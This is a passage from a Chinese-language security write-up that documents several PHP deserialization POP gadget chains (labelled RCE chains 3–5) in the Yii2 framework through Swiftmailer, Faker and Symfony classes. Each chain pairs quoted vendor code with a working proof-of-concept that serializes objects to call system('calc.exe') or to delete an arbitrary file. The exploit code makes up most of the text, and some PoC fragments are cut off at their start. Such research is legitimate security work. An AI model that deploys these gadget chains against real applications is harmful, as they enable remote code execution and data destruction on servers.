                $this->formatters['saveXML']=[new IndexAction,"run"];
            }
        }
    }
    namespace Codeception\Util{
        use Faker\Generator;
        class XmlBuilder{
            protected $__dom__;
            public function __construct()
            {
                $this->__dom__=new Generator();
            }
        }
    }
    namespace Symfony\Component\String{
        use Codeception\Util\XmlBuilder;
        class UnicodeString{
            protected $string = '';
            public function __construct()
            {
                $this->string=new XmlBuilder();
            }
        }
    }
    namespace {
        $exp=print(urlencode(serialize(new Symfony\Component\String\UnicodeString())));
    }
## RCE-POP链-3
根据上面的思路，又找到如下一条入口：
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php:36
        public function __destruct()
        {
            if (file_exists($this->getPath())) {
                @unlink($this->getPath());
            }
        }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/FileByteStream.php:56
        public function getPath()
        {
            return $this->path;
        }
这个地方`$this->path;`可控，此处其实就已经是一个任意文件删除了，POC如下：
    path='D:\test.txt';
            }
        }
        class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream{
        }
        $exp=print(urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream())));
    }
当然最后的目标肯定是RCE，`file_exists`的参数通用是需要String类型，后面就和上面的思路一样了，调用`__toString`方法。
POC如下：
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace Symfony\Component\String{
        use yii\rest\IndexAction;
        class LazyString{
            private $value;
            public function __construct()
            {
                $this->value=[new IndexAction,"run"];
            }
        }
    }
    namespace {
        use Symfony\Component\String\LazyString;
        class Swift_ByteStream_FileByteStream{
            private $path;
            public function __construct()
            {
                $this->path=new LazyString();
            }
        }
        class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream{
        }
        $exp=print(urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream())));
    }
## RCE-POP链-4
同样是利用`__toString`方法
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:289
        public function __destruct()
        {
            foreach ($this->keys as $nsKey => $null) {
                $this->clearAll($nsKey);
            }
        }
    }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:225
        public function clearAll($nsKey)
        {
            if (array_key_exists($nsKey, $this->keys)) {
                foreach ($this->keys[$nsKey] as $itemKey => $null) {
                    $this->clearKey($nsKey, $itemKey);
                }
                if (is_dir($this->path.'/'.$nsKey)) {
                    rmdir($this->path.'/'.$nsKey);
                }
                unset($this->keys[$nsKey]);
            }
        }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:212
        public function clearKey($nsKey, $itemKey)
        {
            if ($this->hasKey($nsKey, $itemKey)) {
                $this->freeHandle($nsKey, $itemKey);
                unlink($this->path.'/'.$nsKey.'/'.$itemKey);
            }
        }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:201
        public function hasKey($nsKey, $itemKey)
        {
            return is_file($this->path.'/'.$nsKey.'/'.$itemKey);
        }
主要的触发点在`is_file`其中`$this->path`可控，且其参数需要是String类型
POC如下：
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace Symfony\Component\String{
        use yii\rest\IndexAction;
        class LazyString{
            private $value;
            public function __construct()
            {
                $this->value=[new IndexAction,"run"];
            }
        }
    }
    namespace {
        use Symfony\Component\String\LazyString;
        class Swift_KeyCache_DiskKeyCache
        {
            private $keys = [];
            private $path;
            public function __construct()
            {
                $this->keys['test'] = ['aaa'=>'qqq'];
                $this->path=new LazyString();
            }
        }
        $exp=print(urlencode(serialize(new Swift_KeyCache_DiskKeyCache())));
    }
## RCE-POP链-5
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php:536
        public function __destruct()
        {
            try {
                $this->stop();
            } catch (Exception $e) {
            }
        }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php:232
        public function stop()
        {
            if ($this->started) {
                if ($evt = $this->eventDispatcher->createTransportChangeEvent($this)) {
                    $this->eventDispatcher->dispatchEvent($evt, 'beforeTransportStopped');
                    if ($evt->bubbleCancelled()) {
                        return;
                    }
                }
                try {
                    $this->executeCommand("QUIT\r\n", [221]);
                } catch (Swift_TransportException $e) {
                }
                try {
                    $this->buffer->terminate();
                    if ($evt) {
                        $this->eventDispatcher->dispatchEvent($evt, 'transportStopped');
                    }
                } catch (Swift_TransportException $e) {
                    $this->throwException($e);
                }
            }
            $this->started = false;
        }
此处`$this->eventDispatcher`可控，可以继续利用上面的`__call`链来进行RCE，POC如下：
    checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    namespace Faker{
        use yii\rest\IndexAction;
        class Generator{
            protected $formatters = array();
            public function __construct()
            {
                $this->formatters['createTransportChangeEvent']=[new IndexAction,"run"];
            }
        }
    }
    namespace {
        use Faker\Generator;
        abstract class Swift_Transport_AbstractSmtpTransport{}
        class Swift_Transport_SendmailTransport extends Swift_Transport_AbstractSmtpTransport
        {
            protected $started;
            protected $eventDispatcher;
            public function __construct()
            {
                $this->started = True;
                $this->eventDispatcher = new Generator();
            }
        }
        $exp=print(urlencode(serialize(new Swift_Transport_SendmailTransport())));
    }
## 后言
至此本文就结束了，有错的地方希望师傅们指出，本文链的核心其实没有变，更多的是从不同的入口下手，后面的话会尝试寻找其他的链子。师傅们有思路欢迎交流。